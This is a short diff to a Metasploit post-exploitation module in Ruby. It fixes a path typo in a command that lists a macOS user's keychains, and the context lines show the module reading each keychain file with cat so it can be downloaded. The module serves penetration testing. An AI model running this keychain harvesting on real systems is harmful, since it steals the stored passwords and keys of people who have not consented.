@@ -382,7 +382,7 @@ class MetasploitModule < Msf::Post
     else
       current_user = cmd_exec("/usr/bin/id -nu")
       print_status("Enumerating and Downloading keychains for #{current_user}")
-      keychain_files = cmd_exec("usr/bin/security list-keychains").split("\n")
+      keychain_files = cmd_exec("/usr/bin/security list-keychains").split("\n")
       keychain_files.each do |k|
 
         keychain_file = cmd_exec("/bin/cat #{k.strip}")
